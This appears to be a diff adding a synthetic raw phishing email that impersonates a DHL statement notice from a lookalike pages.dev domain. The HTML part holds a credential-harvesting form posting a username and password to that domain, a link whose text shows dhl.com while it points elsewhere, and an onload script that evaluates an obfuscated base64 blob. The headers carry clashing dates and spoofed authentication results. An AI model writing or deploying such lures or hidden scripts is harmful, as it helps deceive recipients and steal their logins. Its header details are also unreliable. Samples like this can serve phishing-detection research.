@@ -1,0 +1,30 @@
+From: notice@dhl-verify.pages.dev
+To: victim37@example.com
+Subject: Monthly statement available [ref U049695]
+Date: Tue, 26 Mar 2002 01:26:00 -0500
+Message-ID: <phish-37-69e0c947-9bbb-42b8-b260-203b3ce2f6aa@dhl-verify.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 15 Mar 2002 11:03:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 27 Mar 2002 00:34:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 05 Mar 2002 11:17:00 -0500
+Return-Path: <notice@dhl-verify.pages.dev>
+Reply-To: notice@dhl-verify.pages.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=dhl-verify.pages.dev; dkim=pass header.d=dhl-verify.pages.dev; dmarc=pass header.from=dhl-verify.pages.dev
+Received-SPF: pass (mx.example.com: domain of notice@dhl-verify.pages.dev designates 192.0.2.57 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=dhl-verify.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-37-678f252b"
+
+--bnd-p-37-678f252b
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://dhl-verify.pages.dev/statement/U049695
+
+Reference: U049695
+--bnd-p-37-678f252b
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://dhl-verify.pages.dev/statement/U049695<br/><br/>Reference: U049695</p><p><a href="http://dhl-verify.pages.dev/login">https://www.dhl.com/signin</a></p><form action="http://dhl-verify.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-37-678f252b--
